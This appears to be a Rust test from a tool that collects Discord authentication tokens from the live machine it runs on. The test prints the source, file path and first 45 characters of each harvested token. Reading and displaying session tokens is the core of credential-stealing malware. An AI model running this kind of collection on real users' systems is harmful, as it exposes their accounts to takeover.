#[test]
#[ignore = "live host only"]
fn live_app_collect() {
    let toks = discord::collect(&[], &[], None);
    println!("LIVE discord collect (app): {} tokens", toks.len());
    for t in toks.iter().take(20) {
        let t_trim: String = t.token.chars().take(45).collect();
        println!("  {} @ {} => {}", t.source, t.path, t_trim);
    }
    assert!(!toks.is_empty(), "no app tokens on live host");
}
